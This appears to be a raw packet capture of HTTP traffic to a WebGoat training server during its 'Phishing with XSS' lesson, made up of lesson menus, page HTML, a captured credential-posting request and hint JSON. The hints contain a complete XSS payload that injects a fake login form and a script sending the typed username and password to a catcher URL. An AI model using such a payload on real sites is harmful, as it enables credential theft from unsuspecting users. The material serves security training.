Logins","type":"LESSON","children":[],"complete":false,"link":"#attack/1036971378/1200"}],"complete":false,"link":null},{"name":"Insecure Communication","type":"CATEGORY","children":[{"name":"Insecure Login","type":"LESSON","children":[],"complete":false,"link":"#attack/1525997619/1300"}],"complete":false,"link":null},{"name":"Insecure Storage","type":"CATEGORY","children":[{"name":"Encoding Basics","type":"LESSON","children":[],"complete":false,"link":"#attack/1786050421/1500"}],"complete":false,"link":null},{"name":"Malicious Execution","type":"CATEGORY","children":[{"name":"Malicious File Execution","type":"LESSON","children":[],"complete":fals.
+82e.
+e,"link":"#attack/2027530490/1600"}],"complete":false,"link":null},{"name":"Parameter Tampering","type":"CATEGORY","children":[{"name":"Bypass HTML Field Restrictions","type":"LESSON","children":[],"complete":fals
+
+T 192.168.0.100:80 -> 192.168.33.1:58713 [A]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:00 GMT.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Connection: keep-alive.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+.
+1eec.
+[{"name":"Introduction","type":"CATEGORY","children":[{"name":"How to work with WebGoat","type":"LESSON","children":[],"complete":true,"link":"#attack/360466308/5"},{"name":"How to create a Legacy Lesson","type":"LESSON","children":[],"complete":false,"link":"#attack/1894705151/5"}],"complete":false,"link":null},{"name":"General","type":"CATEGORY","children":[{"name":"Http Basics","type":"LESSON","children":[],"complete":false,"link":"#attack/1869022003/100"}],"complete":false,"link":null},{"name":"Access Control Flaws","type":"CATEGORY","children":[{"name":"Using an Access Control Matrix","type":"LESSON","children":[],"complete":false,"link":"#attack/1708534694/200"},{"name":"Bypass a Path Based Access Control Scheme","type":"LESSON","children":[],"complete":false,"link":"#attack/231255157/200"},{"name":"LAB: Role Based Access Control","type":"LESSON","children":[{"name":"Stage 1: Bypass Business Layer Access Control","type":"STAGE","children":[],"complete":false,"link":"#attack/160587164/200/1"},{"name":"Stage 2: Add Business Layer Access Control","type":"STAGE","children":[],"complete":false,"link":"#attack/160587164/200/2"},{"name":"Stage 3: Bypass Data Layer Access Control","type":"STAGE","children":[],"complete":false,"link":"#attack/160587164/200/3"},{"name":"Stage 4: Add Data Layer Access Control","type":"STAGE","children":[],"complete":false,"link":"#attack/160587164/200/4"}],"complete":false,"link":"#attack/160587164/200"}],"complete":false,"link":null},{"name":"AJAX Security","type":"CATEGORY","children":[{"name":"DOM Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/76122667/400"},{"name":"LAB: DOM-Based cross-site scripting","type":"LESSON","children":[],"complete":false,"link":"#attack/2022121558/400"},{"name":"LAB: Client Side Filtering","type":"LESSON","children":[],"complete":false,"link":"#attack/330535848/400"},{"name":"XML Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/2000980640/400"},{"name":"JSON Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/1426618575/400"},{"name":"Silent Transactions Attacks","type":"LESSON","children":[],"complete":false,"link":"#attack/218322538/400"},{"name":"Insecure Client Storage","type":"LESSON","children":[],"complete":false,"link":"#attack/1129417221/400"},{"name":"Dangerous Use of Eval","type":"LESSON","children":[],"complete":false,"link":"#attack/136634854/400"},{"name":"Same Origin Policy Protection","type":"LESSON","children":[],"complete":false,"link":"#attack/1750680855/400"}],"complete":false,"link":null},{"name":"Authentication Flaws","type":"CATEGORY","children":[{"name":"Password Strength","type":"LESSON","children":[],"complete":false,"link":"#attack/1778575388/500"},{"name":"Forgot Password","type":"LESSON","children":[],"complete":false,"link":"#attack/372049154/500"},{"name":"Multi Level Login 1","type":"LESSON","children":[],"complete":false,"link":"#attack/810720179/500"},{"name":"Multi Level Login 2","type":"LESSON","children":[],"complete":false,"link":"#attack/810720180/500"}],"complete":false,"link":null},{"name":"Buffer Overflows","type":"CATEGORY","children":[{"name":"Off-by-One Overflows","type":"LESSON","children":[],"complete":false,"link":"#attack/736032128/600"}],"complete":false,"link":null},{"name":"Code Quality","type":"CATEGORY","children":[{"name":"Discover Clues in the HTML","type":"LESSON","children":[],"complete":false,"link":"#attack/125644239/700"}],"complete":false,"link":null},{"name":"Concurrency","type":"CATEGORY","children":[{"name":"Thread Safety Problems","type":"LESSON","children":[],"complete":false,"link":"#attack/339531107/800"},{"name":"Shopping Cart Concurrency Flaw","type":"LESSON","children":[],"complete":false,"link":"#attack/734491955/800"}],"complete":false,"link":null},{"name":"Cross-Site Scripting (XSS)","type":"CATEGORY","children":[{"name":"Phishing with XSS","type":"LESSON","children":[],"complete":false,"link":"#attack/1382523204/900"},{"name":"Stored XSS Attacks","type":"LESSON","children":[],"complete":false,"link":"#attack/598569451/900"},{"name":"LAB: Cross Site Scripting","type":"LESSON","children":[{"name":"Stage 1: Stored XSS","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/1"},{"name":"Stage 2: Block Stored XSS using Input Validation","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/2"},{"name":"Stage 3: Stored XSS Revisited","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/3"},{"name":"Stage 4: Block Stored XSS using Output Encoding","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/4"},{"name":"Stage 5: Reflected XSS","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/5"},{"name":"Stage 6: Block Reflected XSS","type":"STAGE","children":[],"complete":false,"link":"#attack/611366032/900/6"}],"complete":false,"link":"#attack/611366032/900"},{"name":"Reflected XSS Attacks","type":"LESSON","children":[],"complete":false,"link":"#attack/1406352188/900"},{"name":"Cross Site Request Forgery (CSRF)","type":"LESSON","children":[],"complete":false,"link":"#attack/2078372/900"},{"name":"CSRF Prompt By-Pass","type":"LESSON","children":[],"complete":false,"link":"#attack/1471017872/900"},{"name":"CSRF Token By-Pass","type":"LESSON","children":[],"complete":false,"link":"#attack/803158781/900"},{"name":"HTTPOnly Test","type":"LESSON","children":[],"complete":false,"link":"#attack/68584332/900"}],"complete":false,"link":null},{"name":"Improper Error Handling","type":"CATEGORY","children":[{"name":"Fail Open Authentication Scheme","type":"LESSON","children":[],"complete":false,"link":"#attack/1075773632/1000"}],"complete":false,"link":null},{"name":"Injection Flaws","type":"CATEGORY","children":[{"name":"Command Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/1922448916/1100"},{"name":"Numeric SQL Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/101829144/1100"},{"name":"Log Spoofing","type":"LESSON","children":[],"complete":false,"link":"#attack/1572295549/1100"},{"name":"XPATH Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/882451674/1100"},{"name":"LAB: SQL Injection","type":"LESSON","children":[{"name":"Stage 1: String SQL Injection","type":"STAGE","children":[],"complete":false,"link":"#attack/1537271095/1100/1"},{"name":"Stage 2: Parameterized Query #1","type":"STAGE","children":[],"complete":false,"link":"#attack/1537271095/1100/2"},{"name":"Stage 3: Numeric SQL Injection","type":"STAGE","children":[],"complete":false,"link":"#attack/1537271095/1100/3"},{"name":"Stage 4: Parameterized Query #2","type":"STAGE","children":[],"complete":false,"link":"#attack/1537271095/1100/4"}],"complete":false,"link":"#attack/1537271095/1100"},{"name":"String SQL Injection","type":"LESSON","children":[],"complete":false,"link":"#attack/538385464/1100"},{"
+
+T 192.168.0.10:8080 -> 192.168.0.100:41065 [AP]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Date: Thu, 18 Jan 2018 13:02:00 GMT.
+Connection: close.
+.
+7b.
+{"lessonTitle":"Phishing with XSS","numberHints":7,"hasSource":true,"hasSolution":true,"hasPlan":true,"submitMethod":"GET"}.
+
+
+T 192.168.0.100:80 -> 192.168.33.1:58712 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:00 GMT.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Connection: keep-alive.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+.
+7b.
+{"lessonTitle":"Phishing with XSS","numberHints":7,"hasSource":true,"hasSolution":true,"hasPlan":true,"submitMethod":"GET"}.
+
+
+T 192.168.33.1:58713 -> 192.168.0.100:80 [AP]
+GET /WebGoat/catcher?PROPERTY=yes&user=test&password=test HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: */*.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+
+
+T 192.168.0.100:41073 -> 192.168.0.10:8080 [AP]
+GET /WebGoat/catcher?PROPERTY=yes&user=test&password=test HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: */*.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+
+
+T 192.168.0.10:8080 -> 192.168.0.100:41073 [AP]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Content-Length: 0.
+Date: Thu, 18 Jan 2018 13:02:12 GMT.
+Connection: close.
+.
+
+
+T 192.168.0.100:80 -> 192.168.33.1:58713 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:12 GMT.
+Content-Length: 0.
+Connection: keep-alive.
+.
+
+
+T 192.168.33.1:58713 -> 192.168.0.100:80 [AP]
+POST /WebGoat/attack?Screen=1382523204&menu=900 HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: */*.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8.
+X-Requested-With: XMLHttpRequest.
+Content-Length: 31.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+user=test&pass=test&login=login
+
+T 192.168.0.100:41074 -> 192.168.0.10:8080 [AP]
+POST /WebGoat/attack?Screen=1382523204&menu=900 HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+Content-Length: 31.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: */*.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+user=test&pass=test&login=login
+
+T 192.168.0.10:8080 -> 192.168.0.100:41074 [AP]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Content-Type: text/html;charset=ISO-8859-1.
+Content-Length: 1256.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Connection: close.
+.
+
+
+
+
+
+<!-- HTML fragment correpsonding to the lesson content -->
+
+
+<div id="lessonContent">
+    
+    This lesson is an example of how a website might support a phishing attack if there is a known XSS attack on the page<BR><BR>Below is an example of a standard search feature.<br>Using XSS and HTML insertion, your goal is to: <UL> <LI>Insert html to that requests credentials <LI>Add javascript to actually collect the credentials <LI>Post the credentials to http://localhost:8080/WebGoat/catcher?PROPERTY=yes...</UL>  to pass this lesson, the credentials must be posted to the catcher servlet.<BR></div>
+<div id="message" class="info"></div>
+
+
+<div id="lessonContent"><form accept-charset='UNKNOWN' method='POST' name='form' action='#attack/1382523204/900' enctype=''><h1>WebGoat Search </h1><table align='center' cellspacing='0' border='0' cellpadding='2'><tr><td colspan='2'>&nbsp;</td></tr><tr><th colspan='2' align='center'>This facility will search the WebGoat source.</th></tr><tr><td colspan='2'>&nbsp;</td></tr><tr><td align='right'><b>Search: </b></td><td align='left'><input name='Username' type='TEXT' value=''></td></tr><tr align='center'><td colspan='2'><input name='SUBMIT' type='SUBMIT' value='Search'></td></tr></table></form></div>
+
+
+
+
+
+
+
+
+
+T 192.168.0.100:80 -> 192.168.33.1:58713 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Content-Type: text/html;charset=ISO-8859-1.
+Content-Length: 1256.
+Connection: keep-alive.
+.
+
+
+
+
+
+<!-- HTML fragment correpsonding to the lesson content -->
+
+
+<div id="lessonContent">
+    
+    This lesson is an example of how a website might support a phishing attack if there is a known XSS attack on the page<BR><BR>Below is an example of a standard search feature.<br>Using XSS and HTML insertion, your goal is to: <UL> <LI>Insert html to that requests credentials <LI>Add javascript to actually collect the credentials <LI>Post the credentials to http://localhost:8080/WebGoat/catcher?PROPERTY=yes...</UL>  to pass this lesson, the credentials must be posted to the catcher servlet.<BR></div>
+<div id="message" class="info"></div>
+
+
+<div id="lessonContent"><form accept-charset='UNKNOWN' method='POST' name='form' action='#attack/1382523204/900' enctype=''><h1>WebGoat Search </h1><table align='center' cellspacing='0' border='0' cellpadding='2'><tr><td colspan='2'>&nbsp;</td></tr><tr><th colspan='2' align='center'>This facility will search the WebGoat source.</th></tr><tr><td colspan='2'>&nbsp;</td></tr><tr><td align='right'><b>Search: </b></td><td align='left'><input name='Username' type='TEXT' value=''></td></tr><tr align='center'><td colspan='2'><input name='SUBMIT' type='SUBMIT' value='Search'></td></tr></table></form></div>
+
+
+
+
+
+
+
+
+
+T 192.168.33.1:58713 -> 192.168.0.100:80 [AP]
+GET /WebGoat/service/lessoninfo.mvc HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+
+
+T 192.168.0.100:41075 -> 192.168.0.10:8080 [AP]
+GET /WebGoat/service/lessoninfo.mvc HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+
+
+T 192.168.33.1:58715 -> 192.168.0.100:80 [AP]
+GET /WebGoat/service/lessonplan.mvc HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+
+
+T 192.168.0.100:41076 -> 192.168.0.10:8080 [AP]
+GET /WebGoat/service/lessonplan.mvc HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+
+
+T 192.168.33.1:58716 -> 192.168.0.100:80 [AP]
+GET /WebGoat/service/solution.mvc HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+
+
+T 192.168.0.100:41077 -> 192.168.0.10:8080 [AP]
+GET /WebGoat/service/solution.mvc HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+
+
+T 192.168.33.1:58714 -> 192.168.0.100:80 [AP]
+GET /WebGoat/service/source.mvc HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+
+
+T 192.168.0.100:41078 -> 192.168.0.10:8080 [AP]
+GET /WebGoat/service/source.mvc HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+
+
+T 192.168.33.1:58712 -> 192.168.0.100:80 [AP]
+GET /WebGoat/service/hint.mvc HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+
+
+T 192.168.0.100:41079 -> 192.168.0.10:8080 [AP]
+GET /WebGoat/service/hint.mvc HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+
+
+T 192.168.33.1:58717 -> 192.168.0.100:80 [AP]
+GET /WebGoat/service/cookie.mvc HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+
+
+T 192.168.0.100:41080 -> 192.168.0.10:8080 [AP]
+GET /WebGoat/service/cookie.mvc HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+
+
+T 192.168.0.10:8080 -> 192.168.0.100:41080 [AP]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Connection: close.
+.
+a3.
+[{"name":"JSESSIONID","value":"1DE275FF3CB6077682FF5DE9D98632FE","comment":null,"domain":null,"maxAge":-1,"path":null,"secure":false,"version":0,"httpOnly":false}].
+
+
+T 192.168.0.100:80 -> 192.168.33.1:58717 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Connection: keep-alive.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+.
+a3.
+[{"name":"JSESSIONID","value":"1DE275FF3CB6077682FF5DE9D98632FE","comment":null,"domain":null,"maxAge":-1,"path":null,"secure":false,"version":0,"httpOnly":false}].
+
+
+T 192.168.0.10:8080 -> 192.168.0.100:41079 [A]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Connection: close.
+.
+10cf.
+[{"hint":"Try adding HTML to the search field to create a fake authentication form, since the form is vulnerable to XSS.<BR> Try to make the form look official.","lesson":"Phishing","number":0},{"hint":"Try: <BR> &lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt;&lt;br&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;","lesson":"Phishing","number":1},{"hint":"Add functionality that can post a request, a button might work<BR><BR>After getting the button on the page, don't forget you will need to steal the credentials and post them to: <BR>http://localhost:8080/WebGoat/capture/PROPERTY=yes&ADD_CREDENTIALS_HERE","lesson":"Phishing","number":2},{"hint":"Try: <BR> &lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot;&gt;<BR><BR>In the whole script:<BR><BR>&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;","lesson":"Phishing","number":3},{"hint":"Make the button perform an action on submit, <BR>adding an onclick=\"hack()\" might work<BR>Don't forget to add the hack() javascript function<BR><BR>In the whole script:<BR><BR>&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;<BR>Also, check firebug. Does the search form need to be terminated for this to work...? (&lt;/form&gt;)","lesson":"Phishing","number":4},{"hint":"You need to create the hack() function.  This function will pull the credentials from the webpage and post them to the WebGoat catcher servlet. <BR><BR> Some useful code snippets:<UL><LI>doucument.phish.user.value - will access the user field<LI>XssImage = new Image(); XssImage.src=SOME_URL = will perform a post<LI>javascript string concatentation uses a \"+\" </UL><BR><BR>The entire javascript portion:<BR><BR>&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src=&quot;http://localhost:8080/WebGoat/catcher?PROPERTY=yes&amp;user=&quot;+document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;;alert(&quot;Had this been a real attack... Your credentials were just stolen.\nUser Name = &quot; + document.phish.user.value + &quot;\nPassword = &quot; +  document.phish.pass.value);} &lt;/script&gt;","lesson":"Phishing","number":5},{"hint":"Complete solution for this lesson:<BR><BR>&lt;/form&gt;&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src=&quot;http://localhost:8080/WebGoat/catcher?PROPERTY=yes&amp;user=&quot; + document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;;alert(&quot;Had this been a real attack... Your credentials were just stolen.\nUser Name = &quot; + document.phish.user.value + &quot;\nPassword = &quot; +  document.phish.pass.value);} &lt;/script&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;passw
+
+T 192.168.0.100:80 -> 192.168.33.1:58712 [A]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Content-Type: application/json.
+Transfer-Encoding: chunked.
+Connection: keep-alive.
